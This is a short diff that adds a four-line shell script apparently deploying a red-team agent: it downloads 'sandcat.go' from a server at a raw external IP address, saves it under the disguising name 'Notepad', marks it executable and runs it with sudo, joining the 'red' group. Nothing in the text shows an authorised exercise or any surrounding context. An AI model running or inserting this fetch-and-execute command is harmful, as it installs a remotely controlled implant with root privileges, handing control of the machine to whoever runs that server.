@@ -1,1 +1,4 @@
-
+server="http://35.194.43.131:8888";
+curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > Notepad;
+chmod +x Notepad;
+sudo ./Notepad -server $server -group red -v
